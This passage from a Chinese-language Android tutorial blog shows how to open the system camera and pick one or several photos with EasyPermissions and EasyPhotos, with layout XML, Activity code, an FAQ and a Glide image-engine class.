class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">external-path</span> <span class="attr">name</span>=<span class="string">&quot;external_files&quot;</span> <span class="attr">path</span>=<span class="string">&quot;.&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-3-界面设计与点击事件"><a href="#2-3-界面设计与点击事件" class="headerlink" title="2.3 界面设计与点击事件"></a>2.3 界面设计与点击事件</h3><p>为方便测试，这里仅给了三个Button，一个相机调用，一个单相片选取，一个多相片选取。</p><p>效果如下：</p><p><img data-src="https://cy-pic.kuaizhan.com/g3/22/72/7f49-3976-4867-9b94-26f39033f6be97"></p><p>代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:gravity</span>=<span class="string">&quot;center&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/bt_camera&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;相机&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;200dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/bt_single_pic&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;单相片选取&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;200dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/bt_multi_pic&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;多相片选取&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;200dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Linearout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>初始化这几个button并添加相应的点击事件，加入一些辅助变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 控件</span></span><br><span class="line">Button btCamera,btSinglePic,btMultiPic;</span><br><span class="line"></span><br><span class="line"><span class="comment">//相机请求码</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CAMERA_REQUEST_CODE = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单张请求码</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SINGLE_REQUEST_CODE = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多张请求码</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MULTI_REQUEST_CODE = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 权限集合</span></span><br><span class="line"><span class="keyword">private</span> String[] permissions = &#123;Manifest.permission.CAMERA,Manifest.permission.WRITE_EXTERNAL_STORAGE&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化view</span></span><br><span class="line">    btCamera = findViewById(R.id.bt_camera);</span><br><span class="line">    btSinglePic = findViewById(R.id.bt_single_pic);</span><br><span class="line">    btMultiPic = findViewById(R.id.bt_multi_pic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增添点击事件</span></span><br><span class="line">    btCamera.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    btSinglePic.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    btMultiPic.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> id = v.getId();</span><br><span class="line">    <span class="keyword">if</span>(R.id.bt_camera == id)&#123;</span><br><span class="line">        <span class="comment">// 调用系统相机</span></span><br><span class="line">        callSystemCamera();</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(R.id.bt_single_pic == id)&#123;</span><br><span class="line">        <span class="comment">// 调用单张相册</span></span><br><span class="line">        callSinglePic();</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(R.id.bt_multi_pic == id)&#123;</span><br><span class="line">        <span class="comment">// 调用多张相册选择</span></span><br><span class="line">        callMultiPic();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-设置权限回调"><a href="#2-4-设置权限回调" class="headerlink" title="2.4 设置权限回调"></a>2.4 设置权限回调</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions, <span class="meta">@NonNull</span> <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onRequestPermissionsResult(requestCode, permissions, grantResults);</span><br><span class="line">    <span class="comment">//框架要求必须这么写</span></span><br><span class="line">    EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, <span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-实现三个功能"><a href="#2-5-实现三个功能" class="headerlink" title="2.5 实现三个功能"></a>2.5 实现三个功能</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 调用系统相机，包含权限检测</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">callSystemCamera</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (EasyPermissions.hasPermissions(<span class="keyword">this</span>, permissions)) &#123;</span><br><span class="line">           <span class="comment">//已经打开权限</span></span><br><span class="line">           useCamera();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//没有打开相关权限、申请权限</span></span><br><span class="line">           getPermission();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 调用相机</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">useCamera</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">       <span class="comment">//此处之所以诸多try catch，为了兼容</span></span><br><span class="line">       intent.setAction(MediaStore.INTENT_ACTION_STILL_IMAGE_CAMERA);</span><br><span class="line">       startActivityForResult(intent, CAMERA_REQUEST_CODE);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 调用系统相册，选择单张图片，包含权限检测</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">callSinglePic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (EasyPermissions.hasPermissions(<span class="keyword">this</span>, permissions)) &#123;</span><br><span class="line">           <span class="comment">//已经打开权限</span></span><br><span class="line">           chooseSinglePhoto();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//没有打开相关权限、申请权限</span></span><br><span class="line">           getPermission();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 选择单张图片</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">chooseSinglePhoto</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">       intent.setAction(Intent.ACTION_PICK);</span><br><span class="line">       intent.setType(<span class="string">&quot;image/*&quot;</span>);</span><br><span class="line">       startActivityForResult(intent, SINGLE_REQUEST_CODE);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 调用第三方相册，选择多张图片</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">callMultiPic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (EasyPermissions.hasPermissions(<span class="keyword">this</span>, permissions)) &#123;</span><br><span class="line">           <span class="comment">//已经打开权限</span></span><br><span class="line">           chooseSMultiPhotos();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//没有打开相关权限、申请权限</span></span><br><span class="line">           getPermission();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">chooseSMultiPhotos</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 初始化相册引擎</span></span><br><span class="line">       EasyPhotos.createAlbum(<span class="keyword">this</span>, <span class="keyword">false</span>, GlideEngine.getInstance())</span><br><span class="line">               .setCount(<span class="number">20</span>)        <span class="comment">// 设置最大选取张数</span></span><br><span class="line">               .setCleanMenu(<span class="keyword">false</span>)</span><br><span class="line">               .setPuzzleMenu(<span class="keyword">false</span>)</span><br><span class="line">               .start(MULTI_REQUEST_CODE);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>其中GlideEngine类我会在文末尾给出。</p><h3 id="2-6-回调处理"><a href="#2-6-回调处理" class="headerlink" title="2.6 回调处理"></a>2.6 回调处理</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理相机或者相册的回调</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> requestCode 请求码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> resultCode  结果码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> data        传出data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, <span class="meta">@Nullable</span> Intent data)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 相机回调处理</span></span><br><span class="line">    <span class="keyword">if</span> (requestCode == CAMERA_REQUEST_CODE &amp;&amp; resultCode == RESULT_CANCELED) &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>,<span class="string">&quot;拍照完成&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 单张回调处理</span></span><br><span class="line">    <span class="keyword">if</span> (requestCode == SINGLE_REQUEST_CODE &amp;&amp; resultCode == RESULT_OK) &#123;</span><br><span class="line">        String photoPath = GetPhotoFromAlbum.getRealPathFromUri(<span class="keyword">this</span>,</span><br><span class="line">                data != <span class="keyword">null</span> ? data.getData() : <span class="keyword">null</span>);</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>,<span class="string">&quot;选择的照片路径为&quot;</span>+photoPath,Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 多张回调处理</span></span><br><span class="line">    <span class="keyword">if</span> (requestCode == MULTI_REQUEST_CODE &amp;&amp; resultCode == RESULT_OK) &#123;</span><br><span class="line">        <span class="comment">// 获取选择图片集合路径</span></span><br><span class="line">        ArrayList&lt;String&gt; photosPath = data.getStringArrayListExtra(EasyPhotos.RESULT_PATHS);</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, String.format(<span class="string">&quot;共选择了%d张图片&quot;</span>, photosPath.size()),Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-相册、相机处理中的FAQ"><a href="#3-相册、相机处理中的FAQ" class="headerlink" title="3. 相册、相机处理中的FAQ"></a>3. 相册、相机处理中的FAQ</h2><p><strong>Q1： 为什么我拍照后相册没有得到更新？</strong></p><p>A1： 可以通过以下方法更新：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通知图库更新</span></span><br><span class="line">MediaScannerConnection.scanFile(MainActivity.<span class="keyword">this</span>, <span class="keyword">new</span> String[]&#123;path&#125;, <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">new</span> MediaScannerConnection.OnScanCompletedListener() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onScanCompleted</span><span class="params">(String path, Uri uri)</span> </span>&#123;</span><br><span class="line">    Intent mediaScanIntent = <span class="keyword">new</span> Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE);</span><br><span class="line">    mediaScanIntent.setData(uri);</span><br><span class="line">    sendBroadcast(mediaScanIntent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中path参数就是你新拍照后的照片路径。</p><p><strong>Q2: 有没有办法设置相机拍照后的相片到一个指定相册?</strong></p><p>A2: 说实话这也让我挺头疼的问题。因为在我搜索出来的结果中，Android似乎并没有提供这样的Api给我们。最后我的实现方法是将刚拍照的图片找出来移动到需要的目录去。这里给一个思路。</p><ol><li>如何找到刚拍照的照片？可以通过时间戳的方式。在进入相机时记录一下时间，退出相机时记录一下时间，然后到系统的相册集中去找在这个时间段的所有照片。</li><li>使用Java IO的相关API去移动图片，注意最好在线程里面做，避免因为移动过多图片造成主线程卡死。</li></ol><h2 id="4-代码中用到的其他文件"><a href="#4-代码中用到的其他文件" class="headerlink" title="4. 代码中用到的其他文件"></a>4. 代码中用到的其他文件</h2><p>GlideEngine.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.raven.mnist_recon;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Bitmap;</span><br><span class="line"><span class="keyword">import</span> android.widget.ImageView;</span><br><span class="line"><span class="keyword">import</span> com.bumptech.glide.Glide;</span><br><span class="line"><span class="keyword">import</span> com.huantansheng.easyphotos.engine.ImageEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions.withCrossFade;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Glide4.x的加载图片引擎实现,单例模式</span></span><br><span class="line"><span class="comment"> * Glide4.x的缓存机制更加智能，已经达到无需配置的境界。如果使用Glide3.x，需要考虑缓存机制。</span></span><br><span class="line"><span class="comment"> * Created by huan on 2018/1/15.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GlideEngine</span> <span class="keyword">implements</span> <span class="title">ImageEngine</span> </span>&#123;</span><br><span class="line">    <span class="comment">//单例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> GlideEngine instance = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">//单例模式，私有构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">GlideEngine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取单例</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> GlideEngine <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == instance) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (GlideEngine.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">null</span> == instance) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> GlideEngine();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加载图片到ImageView</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context   上下文</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> photoPath 图片路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> imageView 加载到的ImageView</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadPhoto</span><span class="params">(Context context, String photoPath, ImageView imageView)</span> </span>&#123;</span><br><span class="line">        Glide.with(context).load(photoPath).transition(withCrossFade()).into(imageView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加载gif动图图片到ImageView，gif动图不动</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context   上下文</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> gifPath   gif动图路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> imageView 加载到的ImageView</span></span><br><span class="line"><span class="comment">     *                  &lt;p&gt;</span></span><br><span class="line"><span class="comment">     *                  备注：不支持动图显示的情况下可以不写</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadGifAsBitmap</span><span class="params">(Context context, String gifPath, ImageView imageView)</span> </span>&#123;</span><br><span class="line">        Glide.with(context).asBitmap().load(gifPath).into(imageView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加载gif动图到ImageView，gif动图动</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context   上下文</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> gifPath   gif动图路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> imageView 加载动图的ImageView</span></span><br><span class="line"><span class="comment">     *                  &lt;p&gt;</span></span><br><span class="line"><span class="comment">     *                  备注：不支持动图显示的情况下可以不写</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadGif</span><span class="params">(Context context, String gifPath, ImageView imageView)</span> </span>&#123;</span><br><span class="line">        Glide.with(context).asGif().load(gifPath).transition(withCrossFade()).into(imageView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取图片加载框架中的缓存Bitmap</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context 上下文</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> path    图片路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> width   图片宽度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> height  图片高度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Bitmap</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception 异常直接抛出，EasyPhotos内部处理</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Bitmap <span class="title">getCacheBitmap</span><span class="params">(Context context, String path, <span class="keyword">int</span> width, <span class="keyword">int</span> height)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Glide.with(context).asBitmap().load(path).submit(width, height).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AlbumUtil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 